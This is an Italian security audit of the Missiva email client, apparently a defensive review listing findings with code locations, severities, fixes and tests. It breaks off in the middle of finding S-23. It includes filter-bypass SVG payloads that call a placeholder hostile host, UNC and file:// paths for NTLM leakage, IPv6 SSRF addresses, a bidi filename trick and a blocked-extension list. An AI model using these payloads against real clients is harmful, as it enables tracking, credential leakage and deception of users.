# Audit di sicurezza di Missiva

Commit di main letto: `59ed8bafa7b59942f04bef8c084bbb5d3455bca9`.

## Metodo e limiti

Lavoro di sola lettura su Linux: Missiva non si esegue, la finestra account di Windows, WPF, WebView2, DPAPI e
l'AppContainer non esistono, la suite `--prova-bozze` non gira. Ogni punto dice se e CONFERMATO (letto nel codice, con
file e riga) o SOSPETTO (e cosa manca per confermarlo). Dove ho potuto, ho provato davvero fuori dal repository:

- Ho compilato copie di `Core/MailHtml.cs` (con AngleSharp) in un progetto console .NET 10 e ho dato in pasto a
  `MailHtml.Prepare` oltre 40 email ostili (vedi la lista nei punti A1-A3), generando per ognuna la pagina del riquadro
  con la stessa CSP e la stessa struttura di `ReadingPage.Document`/`Body`.
- Ho caricato quelle pagine in Chromium headless (Playwright) **con JavaScript spento**, come il riquadro
  (`IsScriptEnabled=false`), intercettando e rifiutando ogni richiesta di rete e registrando chi tentava di uscire. I
  risultati "MISURATO (Chromium, JS spento)" vengono da qui. Chromium headless non e WebView2: resta la differenza fra
  `javaScriptEnabled=false` di Playwright e `IsScriptEnabled=false` di WebView2, e fra le versioni del motore.
- Ho confermato nel codice sorgente pubblico di SharpVectors al tag della dipendenza (v1.8.6) i comportamenti del punto
  A-logo; non li ho eseguiti.

Nei dati di prova e nel testo uso segnaposto: `banca.example`, `dominio-ostile.example`, `posta-gratuita.example`,
`<indirizzo>`, `<id-app>`, `<tenant>`.

Gia deciso, non riproposto: WebView2 come motore (JS spento, CSP `script-src 'none'`); servizio di rete di WebView2 in
un processo suo; niente anteprima di Office; editore Microsoft non verificato; client OAuth di Google creato
dall'utente; fascia gialla per i certificati PEC che Windows non riconosce. Sul controllo di revoca in rete: assente per
PEC e p7m (`DisableCertificateDownloads`, `Pec.cs`), cioe un certificato revocato dopo l'emissione risulta ancora
valido; lo segnalo una volta sola, come chiesto, e non torno sul tema.

---

## Riquadro di lettura (A)

### A1-A3 La CSP e il doppio blocco delle risorse esterne tengono, su 40+ email ostili

Prima di elencare i difetti, il risultato piu importante e positivo: **con le immagini non consentite, nessuna delle
oltre 40 email ostili che ho provato ha fatto partire una sola richiesta di rete** (MISURATO, Chromium headless, JS
spento). Ho coperto: `@import` con escape (`&#64;import`, `u\72l(`), `url()` con parentesi e apici annidati, `src` con
schema spezzato da tab/a-capo/caratteri di controllo iniziali, `//host`, `\\host`, `srcset`, `image-set`, attributo
`background`, `<input type=image>`, `poster`, `<object>`/`<embed>`, `<link rel=preconnect|stylesheet|dns-prefetch>`,
`<meta http-equiv=refresh>` + `<base>`, `@font-face`, `ping`, `<svg><image>` con `<animate>`/`<set>` che ciclano `href`,
`<use>`, un `<template shadowrootmode>` annidato nell'email, uscite dallo shadow tramite `</template>` dentro `<xmp>`,
`<noembed>`, `<noframes>`, `<plaintext>`, `<!--...-->`, `<svg><style>` con entita, `math`+`mglyph`, e `iframe srcdoc`.
Il doppio livello regge: `MailHtml.Prepare` toglie o neutralizza l'attributo (`Core/MailHtml.cs:56-158`,
`Css` a `:393`), e quando sbaglia interviene `OnResourceRequested`, che risponde 403 a tutto cio che non e la pagina o
una `cid:` gia nota, e lascia passare da Internet **solo** immagini e solo se la pagina ha un mittente consentito
(`UI/ReadingView.xaml.cs:1086-1108`).

Anche la cornice tiene: un `position:fixed`, un `:host{position:fixed !important}` e un `<div>` a schermo intero dentro
l'email restano confinati in `.content` (`transform: translate(0)` + `overflow-y: clip`, `UI/ReadingPage.cs:609`):
nelle foto l'intestazione blu e la fascia rossa restano visibili sopra (MISURATO, Chromium). Un `<button popovertarget>`
e `command=show-popover` **non si aprono** con JS spento (MISURATO): restano inerti, quindi non possono coprire
l'interfaccia.

I difetti che seguono sono i casi in cui qualcosa sfugge.

### S-01 Icone dei siti: `SafeSvg` si aggira e SharpVectors carica risorse esterne (SSRF, possibile hash NTLM)

- Dove: `Core/SenderLogos.cs:415-424` (`SafeSvg`) e `:426-432` (`RenderSvgAsync`).

  ```
  internal static bool SafeSvg(string svg)
  {
      var lower = svg.ToLowerInvariant();
      if (!lower.Contains("<svg") || Forbidden.Any(lower.Contains)) return false;
      ...
  }
  static Task<byte[]?> RenderSvgAsync(byte[] data) => OnStaAsync(() =>
  {
      if (!SafeSvg(Encoding.UTF8.GetString(data))) return null;
      ...
      var reader = new SharpVectors.Converters.FileSvgReader(settings);
      using var stream = new MemoryStream(data);
      var drawing = reader.Read(stream);
  ```

- Scenario: un mittente rende "noto" il suo dominio (posta ricevuta in due giorni diversi, la prima da almeno 14 giorni,
  fuori dallo Spam: `IsKnown`, `:119`). Da allora, **alla sola comparsa di una sua riga nell'elenco**, Missiva scarica
  l'icona del suo sito e, se e un SVG, la disegna con SharpVectors nel processo principale. `SafeSvg` e una lista nera di
  sottostringhe applicata al testo UTF-8, ma:
  1. i riferimenti di carattere XML vengono decodificati dal parser *dopo* il controllo: `<style>&#64;import
     "https://dominio-ostile.example/x.css"</style>` non contiene ne `@import` ne `url(`, e passa; cosi
     `fill:u&#114;l(file://dominio-ostile.example/s/a.svg#g)`;
  2. il filtro legge `data` come UTF-8, ma a SharpVectors arriva `data` grezzo: un SVG gzip (`svgz`) o UTF-16 non viene
     visto dal filtro (SOSPETTO: dipende da come SharpVectors apre lo stream);
  3. Missiva non imposta `WpfDrawingSettings.ExternalResourcesAccessMode` ne `CanUseBitmap`: nel sorgente di SharpVectors
     1.8.6 il valore predefinito e "consenti", quindi il disegno puo fare GET http/https (fuori dal `ConnectCallback`
     con `IsPublic`, quindi verso IP privati e `http://192.168.x.x/...`) e aprire percorsi UNC `\\host\...` (su cui
     Windows autentica via SMB, con invio dell'hash NTLM).
- Gravita: Alta. Zero clic dopo la precondizione, e aggira proprio il filtro scritto per impedirlo. La fuga NTLM dipende
  dalla rete (porta 445/WebDAV in uscita); senza quella resta SSRF verso la rete locale e conferma di lettura.
- Stato: lato Missiva CONFERMATO (filtro sul testo, byte grezzi a SharpVectors, nessuna impostazione di blocco). Lato
  SharpVectors SOSPETTO forte: letto nel suo sorgente a v1.8.6, non eseguito.
- Proposta: (a) impostare `ExternalResourcesAccessMode = Ignore` e `CanUseBitmap = false` e verificare che arrivi al
  documento; (b) sostituire la lista nera con un parsing vero (`XmlReader` con `DtdProcessing.Prohibit`,
  `XmlResolver = null`, limite di caratteri; lista bianca di elementi e attributi; `href`/`url()` solo se iniziano con
  `#`), poi riserializzare in UTF-8 e passare a SharpVectors il testo controllato, non i byte; (c) rifiutare prima del
  filtro i byte che iniziano con `1F 8B` (gzip), un BOM non UTF-8 o byte nulli. In alternativa, niente SVG per le icone
  dei siti (SVG solo per BIMI con VMC) o disegno nel processo isolato dell'anteprima.
- Verifica su Windows: in `--prova-bozze` (rendere `RenderSvgAsync` internal) `SafeSvg` deve dare falso per i due SVG con
  `&#64;import` e `u&#114;l(...)`; con un TcpListener su `127.0.0.1:P`, `RenderSvgAsync` di un SVG che punta a quel
  listener non deve aprire connessioni. A mano, con `file://127.0.0.1/c$/x`, controllare con Process Monitor che non
  parta SMB.

### S-02 Icone raster dei siti decodificate con la scelta automatica dei codec WIC, senza limite di misure

- Dove: `Core/SenderLogos.cs:445-450` (`RenderRasterAsync`).

  ```
  var decoder = BitmapDecoder.Create(new MemoryStream(data), BitmapCreateOptions.PreservePixelFormat | ..., BitmapCacheOption.OnLoad);
  var frame = decoder.Frames.Where(f => f.PixelWidth <= 1024 && f.PixelHeight <= 1024)
  ```

- Scenario: stesso dominio "noto" del punto S-01. `BitmapDecoder.Create` su uno stream prova ogni codec WIC installato
  (HEIF, WebP, RAW, codec di terzi), proprio cio che il resto del progetto evita di proposito (`Core/FlowToHtml.cs:349`,
  `EditorImages`). Le favicon e le apple-touch-icon scelte dal mittente si decodificano senza clic, nel processo con i
  token e la posta. Il filtro delle misure (1024) arriva dopo `Create` con `OnLoad`: un PNG piccolo con IHDR enorme puo
  allocare molta memoria (SOSPETTO: momento della decodifica con OnLoad).
- Gravita: Media. Superficie dei codec nel processo principale, senza clic.
- Stato: CONFERMATO per la scelta automatica; SOSPETTO l'esaurimento di memoria.
- Proposta: decodificatore esplicito scelto dalla firma (PNG/ICO/JPEG/GIF, aggiungendo ICO a quelli di `EditorImages`),
  misure lette dall'intestazione prima di decodificare, oppure decodifica nel processo dell'anteprima
  (`PdfWorker.ImageAsync`).
- Verifica su Windows: `--prova-bozze` con byte TIFF/WebP (rifiutati senza creare un decodificatore) e un PNG 30000x30000
  da ~30 KB (rifiutato in meno di 100 ms, senza crescita di memoria).

### S-03 I loghi partono alla sola visualizzazione dell'elenco: conferma di lettura e IP, per qualunque dominio

- Dove: `UI/ViewModels.cs:1228-1232` (`Request` dal costruttore della riga), `Core/SenderLogos.cs:165` (`Request`),
  `:190` (`BimiAsync` chiamato sempre), `:235-244` (TXT `default._bimi.<dominio>` e GET dell'URL `a=` prima della
  verifica), `:368` (User-Agent che dice "Missiva").
- Scenario: per BIMI la richiesta parte per **qualunque** dominio di una riga non indesiderata, anche mai visto: Missiva
  interroga il DNS e, se c'e un record BIMI, scarica l'URL `a=` scelto dal mittente, dall'IP dell'utente, prima di ogni
  verifica. Aggira il blocco delle immagini remote del riquadro: il mittente sa quando il messaggio e comparso
  nell'elenco e da quale IP, una volta per dominio ogni 14 giorni (file `.none`). Basta un dominio per campagna.
- Gravita: Media (privacy): e una conferma di recapito che il riquadro invece nega.
- Stato: CONFERMATO.
- Proposta: chiedere BIMI (e l'icona del sito) solo per i domini gia `IsKnown` e che hanno superato DMARC in un
  messaggio ricevuto (vedi S-04); User-Agent generico; eventuale ritardo casuale staccato dal momento della
  visualizzazione.
- Verifica su Windows: gancio DEBUG `UseTestHandler` per le richieste dei loghi; con `MailDns.TestTxt` che restituisce un
  record BIMI per un dominio non noto, nessuna richiesta deve arrivare al gestore finto.

### S-04 Il logo si mostra senza verificare chi scrive davvero (DMARC): un From falsificato mostra il logo vero

- Dove: `UI/ViewModels.cs:742` (`LogoDomain`, unica esclusione lo Spam), `UI/ReadingView.xaml.cs:836-837` (`LogoOf`,
  esclude solo lo Spam). `SenderCheck.Of` si calcola per la fascia (`:792`) ma non decide il logo.
- Scenario: un messaggio con `From: sicurezza@banca.example` falsificato, arrivato in Posta in arrivo perche il server
  non applica DMARC o il dominio e `p=none`, mostra nell'elenco il logo vero della banca; nel riquadro il logo resta
  anche con la fascia rossa. La specifica BIMI richiede DMARC superato: qui il logo, che e un segnale di fiducia (lo dice
  il commento a `:21`), non lo richiede.
- Gravita: Media.
- Stato: CONFERMATO.
- Proposta: segnare in `domini.dat` il dominio come "autenticato" solo quando `SenderCheck.Own` da `dmarc=pass` allineato
  al From; mostrare il logo (elenco e riquadro) solo per i domini autenticati; in `LogoOf`, null se
  `SenderNotes.Unverified != null`.
- Verifica su Windows: `--prova-bozze`, `ReadingPage.Build` con una `PageEntry` che ha il logo e un `SenderNotes` con
  `Unverified` impostato: nell'HTML non deve comparire `/logo/`.

### S-05 `NavigationStarting`, link e schemi: a posto; resta un sotto-rischio sull'host ideografico

Ho verificato gli altri punti della domanda A4 e sono a posto (vedi "Guardato e a posto"): `file:`, `ms-*`, UNC e gli
schemi diversi da http/https/mailto non si aprono mai (`UI/ReadingView.xaml.cs:1513-1529`), le azioni passano solo se
portano il gettone della pagina mostrata (`:1116-1140`), `LinkTarget` normalizza come Chromium e scarta cio che .NET non
sa leggere (`Core/MailHtml.cs:325-338`). Un residuo: `MailHtml.LinkTarget` accetta un host scritto col punto ideografico
(`missiva。example`) e lo tiene come link (MISURATO: compare in `Links`). Non raggiunge la pagina (host diverso da
`missiva.example`) e al clic passa da `Safety.LinkWarning`, che segnala gli host `xn--`; ma conviene normalizzare l'host
con IDN prima del confronto con `PageHost`. Gravita Bassa, CONFERMATO.

### S-06 Il gettone della pagina e in attributi leggibili dal CSS dell'email (difesa in profondita)

- Dove: `UI/ReadingPage.cs:461-464` (gli `action="https://missiva.example/do/<gettone>/..."` dei form stanno in `.head`,
  fuori dalla shadow root ma dentro l'`<article>` che e antenato del host `.mail`).
- Scenario: con le immagini consentite (mittente fidato), un `:host-context(article) .x{background:url(...)}` nella
  shadow dell'email fa partire la richiesta (MISURATO: `hostcontext-plain-yes` parte). Un selettore che tenti di leggere
  il gettone, `:host-context(article:has(form[action*="/do/0123"]))`, **non** ha fatto partire la richiesta (MISURATO:
  Chromium non combina `:has` dentro `:host-context`, la regola viene scartata). Quindi oggi il gettone non e
  esfiltrabile; ma il fatto che `:host-context` raggiunga lo stato di un antenato mostra che la difesa dipende da un
  limite del motore, non dall'isolamento.
- Gravita: Bassa.
- Stato: CONFERMATO che oggi non si legge (MISURATO); SOSPETTO come rischio futuro se il motore cambiasse.
- Proposta: il gettone non serve a dare poteri (senza JS l'email non puo premere i pulsanti); come difesa in profondita,
  non metterlo in un attributo che il CSS dell'email puo raggiungere (per esempio convalidarlo con un valore non nel DOM,
  o isolare l'email in modo che `:host-context` non veda l'`<article>`).
- Verifica su Windows: la stessa prova con Edge headless sulla pagina reale, a immagini consentite.

### S-07 `ExecuteScriptAsync`: le anteprime sono codificate, a posto

Le anteprime dei messaggi compressi passano da `JsonSerializer.Serialize(...)` prima di entrare nello script
(`UI/ReadingView.xaml.cs:431`), quindi il testo del mittente non puo iniettare codice. Oggetto, nomi, allegati e
categorie nella pagina passano tutti da `WebUtility.HtmlEncode` (`E(...)` in `UI/ReadingPage.cs`). A posto, CONFERMATO.

### S-08 Impostazioni di WebView2: a posto, tranne la persistenza del profilo

Script, dialoghi, host objects, web messages, autofill, password, download e permessi sono tutti spenti
(`UI/ReadingView.xaml.cs:931-953`). Resta un punto: la cartella dati del profilo e persistente
(`Path.Combine(Store.Dir, "WebView2")`, `:879`), quindi la cache HTTP e i cookie dei server delle immagini consentite
restano in chiaro su disco fra le sessioni e identificano lo stesso PC. Gravita Bassa, SOSPETTO (politica cookie di
terze parti di questa versione non verificata). Proposta: `IsInPrivateModeEnabled = true`, oppure
`Profile.ClearBrowsingDataAsync` all'avvio/uscita e `PreferredTrackingPreventionLevel = Strict`.

---

## Allegati e file (B)

### S-09 Nomi degli allegati: i caratteri bidirezionali restano, e il nome mostrato non e sempre quello salvato

- Dove: `Core/Safety.cs:44-51` (`SafeFileName`), `UI/ReadingPage.cs:347` (scheda: `Safety.IsDangerous(a.Name)`, sul nome
  **grezzo**), `UI/ReadingView.xaml.cs:1406,1413` (apri: `IsDangerous` sul nome **pulito**).

  ```
  var invalid = Path.GetInvalidFileNameChars().Concat(new[] { ':', '*', '?', '"', '<', '>', '|', '\\', '/' }).ToArray();
  var clean = string.Concat((name ?? "").Split(invalid)).Trim().TrimEnd('.', ' ');
  ```

- Scenario: `GetInvalidFileNameChars` non comprende i caratteri di formato bidirezionale (U+202E RLO, U+200E/F,
  U+2066-2069, U+061C). La scheda, la pastiglia e l'anteprima mostrano il nome grezzo, che con U+202E appare rovesciato:
  `Relazione[U+202E]fdp.exe` si legge come `Relazioneexe.pdf`. Inoltre la scheda decide il rosso (`IsDangerous`) sul nome
  grezzo, mentre Apri e Salva tutti sul nome pulito: se un carattere tolto da `SafeFileName` spezza l'estensione, la
  scheda puo non diventare rossa (la conferma all'apertura resta).
- Gravita: Bassa (inganno visivo; restano marchio web e SmartScreen).
- Stato: CONFERMATO.
- Proposta: un solo nome mostrato per allegato, calcolato una volta (`SafeFileName` piu la rimozione dei caratteri di
  formato bidirezionale e a larghezza zero) e usato per scheda, pastiglia, titoli, domande, `IsDangerous` e salvataggio.
- Verifica su Windows: `--prova-bozze` con un nome che contiene U+202E; `SafeFileName` lo toglie e `IsDangerous` da lo
  stesso risultato sul grezzo e sul pulito.

### S-10 Il marchio web manca su "Salva con nome .eml" e su "Salva come PDF"; un errore del marchio non ferma l'apertura

- Dove: `UI/MainWindow.xaml.cs:3954` (`SaveEmlAsync`: `File.WriteAllBytesAsync` senza `MarkFromInternet`);
  `Core/Safety.cs:62-74` (`MarkFromInternet` ingoia l'errore); `UI/ReadingView.xaml.cs:1447-1449` (apre comunque dopo il
  marchio).
- Scenario: l'`.eml` salvato (e il PDF di "Salva come PDF") non ricevono `Zone.Identifier`, quindi niente Visualizzazione
  protetta di Office ne SmartScreen quando li si riapre. E se `MarkFromInternet` fallisce (cartella temporanea su FAT o
  exFAT), il file si apre lo stesso senza marchio.
- Gravita: Bassa.
- Stato: CONFERMATO.
- Proposta: chiamare `MarkFromInternet` anche in `SaveEmlAsync` (e nel PDF); farle restituire `bool` e, se fallisce in
  Apri, avvisare almeno per i documenti Office e i tipi pericolosi.
- Verifica su Windows: leggere il flusso `Zone.Identifier` dopo "Salva con nome .eml".

### S-11 `Safety.Dangerous`: cosa manca

- Dove: `Core/Safety.cs:21-31`. Rispetto alla lista di Outlook, dall'elenco chiesto mancano solo `.one`, `.psm1`,
  `.docm`, `.xlsm`, `.pptm`. Tutti gli altri ci sono (`.iso .img .vhd .vhdx .lnk .url .js .jse .vbs .vbe .wsf .wsh .hta
  .msi .msp .scr .xll .jar .ps1 .bat .cmd .cpl .chm .reg .appref-ms .application` e altri).
- Nota: i documenti con macro (`.docm`, `.xlsm`, `.pptm`) **non** vanno nella lista di blocco. Office blocca le macro dei
  file col marchio web: per questo conta di piu il marchio del punto S-10. `.one` e un allegato eseguibile vero e proprio
  e va aggiunto.
- Gravita: Bassa.
- Stato: CONFERMATO.
- Proposta: aggiungere `.one`/`.onepkg` (e valutare `.psm1`); lasciare i documenti con macro alla protezione del marchio.
- Verifica su Windows: aggiungere i tipi nuovi a `DangerousTypes` in `--prova-bozze`.

### S-12 Processo dei PDF: le risposte del processo non sono validate

- Dove: `Core/PdfWorker.cs:254` (numero di pagine letto senza limite), `UI/AttachmentPreview.cs:249-255` (un `Border` per
  pagina sul thread dell'interfaccia), `UI/AttachmentPreview.cs:361-366` (`PngBitmapDecoder` del PNG ricevuto senza
  controllo di misure), `Core/PdfWorker.cs:263-266` (`reader.ReadString()` del messaggio d'errore senza limite).
- Scenario: con un motore PDF compromesso (serve prima un difetto in Windows.Data.Pdf) il processo figlio puo far
  allocare a Missiva fino a 200 MB per risposta, far creare moltissimi `Border` sull'interfaccia e far decodificare un
  PNG enorme nel processo con i privilegi. Anche senza compromissione, `ImageRender` rimpicciolisce solo per larghezza:
  un'immagine 1440x65535 arriva intera (~377 MB).
- Gravita: Bassa (serve prima un altro difetto).
- Stato: CONFERMATO l'assenza dei controlli; SOSPETTO il comportamento di Windows.Data.Pdf (numero di pagine).
- Proposta: limite al numero di pagine (lato processo e lato Missiva); leggere IHDR e validare larghezza/altezza prima di
  decodificare; messaggio d'errore al massimo 1 KB e senza a-capo; tetto di allocazione per risposta piu basso; meglio
  ancora, pixel BGRA grezzi con misure verificate invece del PNG.
- Verifica su Windows: `PdfTestsAsync` con un'immagine 1440x65535 e un processo finto che dichiara 2^31-1 pagine e un PNG
  con IHDR enorme.

### S-13 AppContainer dei PDF: eredita tutto l'ambiente; se il job non si applica si prosegue; mancano limiti

- Dove: `Core/Sandbox.cs:110-112` (tutte le variabili d'ambiente passate al figlio); `Core/PdfWorker.cs:321-322,429-456`
  (se `AssignProcessToJobObject` fallisce si va avanti senza il limite di un solo processo; nessun limite di memoria ne
  restrizioni UI); `Core/Sandbox.cs:69-71,81-83` (`GrantRead` da la lettura a tutta la cartella dell'eseguibile, con
  ereditarieta, e `disinstalla.ps1` non toglie la voce).
- Scenario: al processo che apre PDF non fidati arrivano le variabili dell'utente (eventuali token) e `DOTNET_*`; senza
  rete non le spedisce, ma e difesa in profondita mancante. Se Missiva.exe viene avviato da Download/Desktop (possibile
  con un eseguibile unico), tutta quella cartella diventa leggibile dal processo dei PDF, e la voce ACL resta dopo la
  disinstallazione.
- Gravita: Bassa.
- Stato: CONFERMATO; SOSPETTO quanto l'AppContainer limiti gia da solo appunti e finestre.
- Proposta: ambiente in lista bianca (SystemRoot, windir, TEMP, PATHEXT, le `DOTNET_` necessarie,
  `DOTNET_BUNDLE_EXTRACT_BASE_DIR`), senza `DOTNET_STARTUP_HOOKS`; se il job non si applica, terminare il processo e
  lanciare `SandboxException`; aggiungere `JOB_OBJECT_LIMIT_PROCESS_MEMORY` e le `JOBOBJECT_BASIC_UI_RESTRICTIONS`; dare
  la lettura solo se la cartella contiene solo file di Missiva (o al solo eseguibile, senza ereditarieta).
- Verifica su Windows: comando di prova DEBUG nel processo che prova a leggere una variabile finta, ad aprire gli appunti
  e `GetDC(NULL)`: devono fallire.

### S-14 `.p7m` e immagini delle bozze: a posto, con un residuo sul cid

`P7m.cs` e robusto (fino a 3 buste, 50 MB, base64/PEM solo se non e DER, XML con `DtdProcessing.Prohibit`). Le immagini
della scrittura usano decodificatori espliciti dalla firma (`Core/FlowToHtml.cs:351-363`). Residuo (S-15 sotto).

### S-15 `HtmlToFlow` riconosce le immagini "di Missiva" dal solo suffisso del cid, scelto dal mittente

- Dove: `Core/HtmlToFlow.cs:317-322` (`if (!cid.EndsWith(EditorImages.ContentIdSuffix))`), con il rimpicciolimento solo
  per larghezza (`Core/FlowToHtml.cs:383-394`).
- Scenario: riprendendo con Modifica una risposta salvata, le immagini incorporate il cui Content-Id finisce con
  `@missiva` vengono decodificate dentro Missiva; il mittente sceglie il proprio Content-Id. I decodificatori sono quelli
  espliciti (non la scelta automatica), quindi il rischio e contenuto; ma un'immagine molto alta resta intera.
- Gravita: Bassa.
- Stato: CONFERMATO.
- Proposta: un cid con un HMAC su chiave locale, o l'elenco dei cid creati da Missiva salvato con la bozza; un tetto
  anche sull'altezza/pixel in `Decode`.
- Verifica su Windows: `--prova-bozze` con una bozza di Graph che contiene un cid `x@missiva` non creato da Missiva: non
  deve diventare un'immagine dell'editor.

---

## Rete e identita (C)

### S-16 `SenderLogos` SSRF, redirect, limiti: per lo piu a posto; lacune in `IsPublic` e con il proxy

Le basi tengono (vedi "Guardato e a posto"): `ConnectCallback` si collega all'IP gia controllato (niente DNS rebinding
fra controllo e connessione), al massimo 3 redirect ognuno ricontrollato, https->http non seguito, tempi e dimensioni
limitati, niente cookie, VMC validato (EKU BIMI, dominio nei SAN, catena su `CustomRootTrust`). Restano due lacune:

- `IsPublic` (`Core/SenderLogos.cs:372-381`) non riconosce gli IPv6 che contengono un IPv4 (NAT64 `64:ff9b::/96`, 6to4
  `2002::/16`, IPv4-compatibili `::a.b.c.d`) ne alcuni IPv4 speciali (`192.0.0.0/24`, blocchi di documentazione). Su una
  rete con NAT64/CLAT un nome che risolve in `64:ff9b::c0a8:101` passa e il gateway lo traduce verso `192.168.1.1`.
  Gravita Bassa, CONFERMATO la lacuna, SOSPETTO la sfruttabilita (dipende dalla rete). Proposta: estrarre l'IPv4 da quei
  prefissi e ricontrollarlo, o ammettere solo `2000::/3` meno i blocchi speciali.
- Con un proxy di sistema su IP pubblico, il `ConnectCallback` controlla l'indirizzo del proxy, non la destinazione
  (`UseProxy` non e impostato). Gravita Bassa, CONFERMATO il codice, SOSPETTO il runtime. Proposta: `UseProxy = false`
  nel `SocketsHttpHandler` dei loghi.
- Verifica su Windows: estendere i controlli IPv6 in `Core/ProvaBozze.cs` con `64:ff9b::c0a8:101`, `2002:c0a8:101::1`,
  `::c0a8:101`, `192.0.0.1`; e, prima del primo uso, impostare un `HttpClient.DefaultProxy` su un listener locale e
  verificare che nessuna connessione lo raggiunga.

### S-17 BIMI: l'SVG `l=` non si confronta col logo del VMC, e il logo salvato non scade mai

- Dove: `Core/SenderLogos.cs:246,251-252` (verificato il VMC, si scarica e si disegna l'SVG di `l=` senza confrontarlo
  col logo dentro il certificato), `:181` (`if (File.Exists(PathOf(domain))) return;`, nessuna scadenza).
- Scenario: chi sta sul percorso DNS falsifica `default._bimi.<marchio>` con l'`a=` vero del marchio (pubblico, valido) e
  un `l=` proprio: Missiva mostra come logo "verificato" un'immagine qualsiasi e la tiene per sempre. Un VMC scaduto o un
  dominio cambiato di proprietario resta comunque.
- Gravita: Bassa (Media finche S-01 e aperto, perche l'SVG `l=` entra in SharpVectors).
- Stato: CONFERMATO.
- Proposta: confrontare l'SVG `l=` col logotype del VMC (OID 1.3.6.1.5.5.7.1.12) o usare quello incorporato; far scadere
  i loghi salvati (es. al NotAfter del VMC o 30 giorni) e riverificarli.

### S-18 TLS di IMAP e SMTP: a posto in Release

`Core/ImapProvider.cs`: solo `SslOnConnect` o `StartTls` (`MailSecurity` non ha un valore "nessuno"); la
`ServerCertificateValidationCallback` che accetta un'impronta fissa e **solo** dentro `#if DEBUG` (`:80-82`), cosi come
`TestPlain`/`MISSIVA_IMAP_FINTO` (`:58-71`). In Release resta il controllo predefinito di MailKit. `GmailProvider` usa
porte e host fissi. A posto, CONFERMATO.

### S-19 Configurazione automatica: accetta le DTD, e l'ISPDB dal MX manda la password fuori dominio senza conferma

- Dove: `Core/MailAutoconfig.cs:133` (`XDocument.Load(buffer)`, che accetta le DTD: `DtdProcessing.Parse` con entita fino
  a 10 milioni di caratteri, al contrario del commento accanto e di `Pec.cs`/`P7m.cs` che usano `Prohibit`); `:52-54`
  (l'ISPDB scelto dal dominio del record MX puo restituire server di un altro dominio senza marcarli `Foreign`); `:214`
  (solo l'SRV e marcato `Foreign`, quindi solo l'SRV chiede conferma prima di mandare la password).
- Scenario: niente XXE (il resolver e null e l'XML viene dal dominio dell'utente o dall'ISPDB), ma le entita interne si
  espandono fino a 10 MB da un file di 256 KB. E chi falsifica l'MX puo far scegliere la configurazione ISPDB di un
  provider di cui controlla i server (dominio scaduto e ricomprato) e ricevere la password senza la domanda che l'SRV fa.
- Gravita: Bassa.
- Stato: CONFERMATO.
- Proposta: `XDocument.Load(XmlReader.Create(buffer, new XmlReaderSettings { DtdProcessing = Prohibit, XmlResolver =
  null, MaxCharactersInDocument = ... }))`; marcare `Foreign` anche la configurazione ISPDB i cui server sono fuori dal
  dominio dell'indirizzo, e rendere generico il testo della conferma (oggi dice "record SRV").
- Verifica su Windows: `MailAutoconfig.UseTestHandler` con un XML con `<!DOCTYPE ...>` ed entita (deve dare null dopo la
  correzione); `MailDns.TestAnswers` con MX di un altro dominio e ISPDB che risponde con i suoi server (deve risultare
  `Foreign`).

### S-20 Accessi Google e Microsoft: a posto

`GoogleAuth`: listener su `127.0.0.1` con porta scelta da Windows, PKCE S256, `state` casuale di 16 byte, risposta 404
senza lo state giusto, lettura limitata e timeout; client secret e `token-google.dat` cifrati con DPAPI. `MicrosoftAuth`:
`CheckChosen` dopo ogni finestra interattiva, consenso incrementale senza finestra che restituisce null, nel registro
solo indirizzo, id client, autorita e nomi dei permessi. Gli URL di Graph con id del server sono per lo piu da sorgenti
fidate; i pochi costruiti con dati esterni sono codificati con `Uri.EscapeDataString`. A posto, CONFERMATO (salvo il
comportamento a runtime di MsalCacheHelper, non verificabile qui).

---

## IPC, mittente e disco (D)

### S-21 Le azioni delle notifiche inviano senza finestra, e il messaggio non e limitato ai notificati

- Dove: `UI/App.cs:943-947,974-976` (`OnToast`/`ActOnNotificationAsync`: `case "reply" when text?...` chiama
  `ReplyFromNotificationAsync` che invia), `UI/MainWindow.Notifications.cs:28` (`FindNotified` cerca anche nell'elenco e
  nella copia locale, non solo nei 50 notificati).
- Scenario: le notifiche di oggi non hanno piu la casella di testo, ma un processo dello stesso utente che attiva il
  server COM delle notifiche (registrato in HKCU) con `action=reply` e un input `reply=<testo>` fa partire una risposta
  **subito**, dall'account, verso qualunque messaggio dell'elenco o della copia locale. `QuickReplyRisk` lavora su corpo
  vuoto e ha lo stesso buco di S-23 sul dominio personale.
- Gravita: Bassa (chi puo farlo e gia un processo dello stesso utente, che con DPAPI legge comunque i token).
- Stato: CONFERMATO nel codice di Missiva; non ho riletto la libreria delle notifiche.
- Proposta: togliere l'invio diretto e aprire sempre la scrittura col testo (`OpenQuickReplyWindow`); come difesa in piu,
  un numero casuale per notifica negli argomenti, tenuto cifrato e verificato.
- Verifica su Windows: in `NotificationActions` di `--prova-bozze`, `OnToast` con `action=reply` e input non deve far
  arrivare nulla al server SMTP/Graph finto, e deve aprire una `ComposeWindow`.

### S-22 Canale con nome: lettura senza limite ne scadenza, `AllowSetForegroundWindow(-1)`

- Dove: `UI/App.cs:273-277` (`NamedPipeServerStream` `CurrentUserOnly`, `ReadLineAsync` senza limite ne timeout), `:...`
  (`AllowSetForegroundWindow(-1)`), `Program.cs:59` (il risultato di `SendToRunning` ignorato).
- Scenario: solo lo stesso utente puo collegarsi (`CurrentUserOnly`, verificato: l'AppContainer dei PDF non e nella DACL
  e non entra). Resta che un client dello stesso utente che non manda mai l'a-capo tiene occupata l'unica istanza (niente
  piu "esci"/"apri"/mailto:), o che un invio enorme fa crescere la memoria; `AllowSetForegroundWindow(-1)` lascia a
  qualunque processo il primo piano fino al prossimo input; e se `SendToRunning` fallisce, il mailto: si perde in
  silenzio.
- Gravita: Bassa (solo blocco del servizio, dallo stesso utente).
- Stato: CONFERMATO (lettura, ASFW, risultato ignorato); SOSPETTO l'integrita bassa.
- Proposta: leggere al massimo 64 KB con timeout di 5 s poi ricreare; passare ad `AllowSetForegroundWindow` il PID della
  copia aperta; nel client controllare che il PID del server abbia lo stesso eseguibile; riprovare `SendToRunning`.
- Verifica su Windows: uno script che apre il canale e resta fermo; dopo la correzione "esci" deve passare entro 5 s.

`Core/Mailto.cs` e invece a posto: tiene solo `to/cc/bcc/subject/body`, ignora `attach`, `from` e le intestazioni; il
testo entra come testo, niente parte senza Invia (vedi "Guardato e a posto"). Unico consiglio: sostituire CR/LF
nell'oggetto con uno spazio in `Mailto.Parse`.

### S-23 `Authentication-Results`: un `;` fra virgolette, o il primo `dmarc=`, possono togliere la fascia rossa

- Dove: `Core/SenderCheck.cs:35-40,56` (`Parse`: `Split(';')` ignora le virgolette; `dmarc ??= value` tiene il primo).

  ```
  var parts = text.ToString().Split(';');
  ...
